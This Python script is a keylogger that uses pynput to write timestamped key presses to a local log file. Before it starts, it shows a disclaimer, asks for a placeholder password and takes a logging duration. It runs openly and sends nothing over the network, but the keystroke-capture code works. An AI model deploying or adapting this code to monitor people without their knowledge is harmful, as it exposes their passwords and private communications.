from getpass import getpass
import pynput
import time
import os
import sys

# Define the log file path
LOG_FILE_PATH = "keylogger_log.txt"

def log_key_event(key):
    """Log the key press event to a file."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    event = f"{timestamp} - {key}\n"
    with open(LOG_FILE_PATH, "a") as log_file:
        log_file.write(event)

def display_disclaimer():
    """Display the keylogger disclaimer and accept terms."""
    print("---------------- Keylogger Disclaimer ----------------")
    print("This keylogger program is intended for educational and ethical purposes only.")
    print("Unauthorized use, distribution, or modification of this program is strictly prohibited.")
    print("By using this program, you agree to the following terms and conditions:")
    print("\n1. You will only use this program on devices and systems for which you have explicit permission.")
    print("2. You will not use this program to violate any laws, regulations, or terms of service.")
    print("3. You will not use this program to harm, disrupt, or exploit any devices or systems.")
    print("4. You will not use this program to intercept, collect, or store any sensitive or confidential information.")
    print("5. You will not redistribute or sell this program without the express permission of the author.")
    print("6. The author is not responsible for any damages or losses incurred as a result of using this program.")
    print("7. You will respect the privacy and security of all devices and systems you interact with using this program.")
    
    accept_terms = input("\nDo you accept these terms and conditions? (y/n): ")
    if accept_terms.lower() != 'y':
        print("You must accept the terms and conditions before using this program.")
        sys.exit()

def authenticate_user():
    """Authenticate user with a password."""
    password = getpass("Enter the password to proceed: ")
    # For demonstration purposes only; in a real application, you would check the password here
    if password != "your_secure_password":
        print("Incorrect password. Exiting.")
        sys.exit()

def get_logging_duration():
    """Prompt the user for the duration of logging."""
    while True:
        try:
            duration = int(input("Enter the duration (in seconds) for which the keystrokes should be logged: "))
            if duration > 0:
                return duration
            else:
                print("Duration must be a positive integer. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")

def main():
    """Main function to run the keylogger."""
    display_disclaimer()
    authenticate_user()
    duration = get_logging_duration()
    
    # Setup the keylogger listener
    with pynput.keyboard.Listener(on_press=log_key_event) as listener:
        start_time = time.time()
        end_time = start_time + duration
        
        # Run the keylogger for the specified duration
        while time.time() < end_time:
            time.sleep(1)

        # Stop the keylogger listener
        listener.stop()
    
    print(f"\nThe log file has been saved to: {os.path.abspath(LOG_FILE_PATH)}")

if __name__ == "__main__":
    main()
